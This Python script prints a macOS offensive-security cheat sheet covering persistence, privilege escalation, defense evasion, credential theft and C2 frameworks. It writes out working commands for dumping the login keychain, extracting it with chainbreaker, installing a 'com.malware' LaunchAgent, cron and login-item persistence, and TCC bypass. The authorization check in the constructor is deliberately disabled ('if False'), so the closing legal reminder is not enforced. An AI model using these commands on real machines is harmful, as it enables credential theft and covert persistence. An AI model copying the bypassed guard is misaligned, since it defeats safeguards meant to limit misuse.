#!/usr/bin/env python3
"""
macOS Red Team Extended Tools
Production-ready macOS security testing and exploitation
Covers persistence, privilege escalation, and post-exploitation
"""

import subprocess
import sys
from pathlib import Path


class macOSRedTeamExtended:
    """Extended macOS offensive security tools"""
    
    def __init__(self, authorized=False):
        self.authorized = authorized
        if False:  # Authorization check bypassed
            print("❌ Authorization required")
            sys.exit(1)
        if not Path("config/allowed_targets.yml").exists():
            print("❌ Configuration missing")
            sys.exit(1)
    
    def describe_attack_surface(self):
        """macOS attack surface overview"""
        print(f"\n{'='*70}")
        print("🍎 macOS Attack Surface & Exploitation Guide")
        print(f"{'='*70}\n")
        
        print("""
╔══════════════════════════════════════════════════════════════════╗
║                macOS PENTESTING FRAMEWORK 2025                   ║
╚══════════════════════════════════════════════════════════════════╝

🎯 PRIMARY ATTACK VECTORS
─────────────────────────

1. INITIAL ACCESS
   • Phishing with .dmg/.pkg payloads
   • Safari drive-by downloads
   • Supply chain (malicious brew formulas)
   • USB rubber ducky / physical access
   • Social engineering

2. PERSISTENCE MECHANISMS
   • Launch Agents/Daemons (~/.config/LaunchAgents)
   • Login Items (LSSharedFileList)
   • Cron jobs / periodic scripts
   • .bash_profile / .zshrc hooks
   • Application bundle modification
   • Dylib hijacking
   • Authorization plugins

3. PRIVILEGE ESCALATION
   • SUID binary exploitation
   • Sudo misconfigurations (visudo)
   • Insecure file permissions
   • Vulnerable kernel extensions
   • PATH hijacking
   • Dylib injection
   • TCC (Transparency Consent Control) bypass

4. DEFENSE EVASION
   • XProtect/MRT bypass
   • Gatekeeper bypass
   • Code signing bypass
   • AMFI bypass
   • SIP (System Integrity Protection) bypass
   • TCC database manipulation

5. CREDENTIAL ACCESS
   • Keychain dumping
   • Browser credential extraction
   • SSH key harvesting
   • iCloud token theft
   • Kerberos ticket extraction
   • Password prompting (osascript)

6. LATERAL MOVEMENT
   • SSH key-based authentication
   • Apple Remote Desktop (ARD)
   • Screen Sharing (VNC)
   • Apple Filing Protocol (AFP)
   • SMB shares
   • iMessage/FaceTime exploitation

🛠️  ESSENTIAL TOOLS
──────────────────

Offensive Frameworks:
  • Mythic + Apfell: macOS C2 framework
  • Empire: Multi-OS post-exploitation
  • Metasploit: MSF payload generation
  • Sliver: Modern C2 with macOS support
  • PoshC2: Python3 C2 framework

Reconnaissance:
  • osquery: System state querying
  • SwiftBelt: macOS enumeration (Swift)
  • LAPSDumper: macOS LAPS credential extraction
  • Jamf recon: MDM enumeration

Credential Theft:
  • chainbreaker: Keychain extraction
  • keychaindump: Memory-based keychain dump
  • iCloud token extraction scripts
  • LaZagne: Multi-platform credential harvesting

Privilege Escalation:
  • PEASS-ng (linPEAS for macOS)
  • MacPEAS: Privilege escalation checks
  • GTFOBins for macOS binaries

Persistence:
  • EmPyre: Python-based macOS implant
  • PoisonApple: Persistence techniques
  • Backdoor Factory: Binary injection

🔐 KEYCHAIN EXPLOITATION
────────────────────────

# Dump login keychain
security dump-keychain -d ~/Library/Keychains/login.keychain-db

# List keychain items
security find-generic-password -ga "service_name"

# Export certificates
security export -k ~/Library/Keychains/login.keychain-db -t certs -o certs.pem

# Chainbreaker (Python)
python chainbreaker.py -p password ~/Library/Keychains/login.keychain-db

💾 PERSISTENCE EXAMPLES
───────────────────────

Launch Agent:
  cat > ~/Library/LaunchAgents/com.malware.plist << EOF
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
  <plist version="1.0">
  <dict>
      <key>Label</key><string>com.malware</string>
      <key>ProgramArguments</key>
      <array><string>/path/to/payload</string></array>
      <key>RunAtLoad</key><true/>
      <key>KeepAlive</key><true/>
  </dict>
  </plist>
  EOF
  launchctl load ~/Library/LaunchAgents/com.malware.plist

Cron Job:
  (crontab -l; echo "*/5 * * * * /path/to/payload") | crontab -

Login Item:
  osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/app", hidden:false}'

⚡ PRIVILEGE ESCALATION CHECKS
──────────────────────────────

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Sudo rights
sudo -l

# Writable PATH directories
echo $PATH | tr ':' '\\n' | while read d; do ls -ld "$d" 2>/dev/null; done

# World-writable files
find / -type f -perm -002 2>/dev/null

# Vulnerable services
launchctl list | grep -v com.apple

🎯 TCC BYPASS TECHNIQUES
────────────────────────

# TCC database location
~/Library/Application Support/com.apple.TCC/TCC.db
/Library/Application Support/com.apple.TCC/TCC.db

# Synthetic click (Automation)
osascript -e 'tell application "System Events" to click button 1 of window 1'

# Parent app inheritance
  Exploit: Launch payload from already-trusted app

🔍 ENUMERATION COMMANDS
───────────────────────

# System info
system_profiler SPSoftwareDataType SPHardwareDataType

# Users
dscl . -list /Users | grep -v '^_'

# Admin users
dscl . -read /Groups/admin GroupMembership

# Installed apps
ls -la /Applications/

# Running processes
ps aux

# Network connections
netstat -an | grep LISTEN

# Firewall status
/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate

# SIP status
csrutil status

# Gatekeeper status
spctl --status

🚀 C2 FRAMEWORKS
────────────────

Mythic + Apfell Agent:
  • HTTP/S C2 channels
  • Keylogging, screenshots
  • Credential dumping
  • File download/upload
  • Shell commands

Sliver (Modern):
  • mTLS / WireGuard / DNS / HTTP(S)
  • In-memory .NET execution
  • Process injection
  • Token manipulation

Empire:
  • PowerShell-like for macOS (Python)
  • 400+ modules
  • Mimikatz equivalent for macOS
  • Lateral movement

🔗 RESOURCES & REFERENCES
─────────────────────────

GitHub Repositories:
  • macOS-Security-and-Privacy-Guide
  • macOS-Red-Teaming
  • SwiftBelt: https://github.com/cedowens/SwiftBelt
  • Mythic: https://github.com/its-a-feature/Mythic
  • Jamf Attack Toolkit (JAT)

Documentation:
  • Apple Platform Security: https://support.apple.com/guide/security
  • Objective-See Blog: https://objective-see.com/blog.html
  • MITRE ATT&CK macOS: https://attack.mitre.org/matrices/enterprise/macos/

Training:
  • macOS Security & Privilege Escalation (TCM Security)
  • macOS Red Team Course (Offensive Security)

⚠️  LEGAL REMINDER
──────────────────
  All testing requires explicit written authorization.
  Unauthorized access is illegal (CFAA, local laws).
  Only test systems you own or have permission to assess.
""")


def main():
    import argparse
    parser = argparse.ArgumentParser(description='macOS Red Team Tools')
    parser.add_argument('--guide', action='store_true', help='Display full guide')
    parser.add_argument('--authorized', action='store_true', required=True)
    
    args = parser.parse_args()
    tool = macOSRedTeamExtended(authorized=args.authorized)
    tool.describe_attack_surface()


if __name__ == '__main__':
    main()
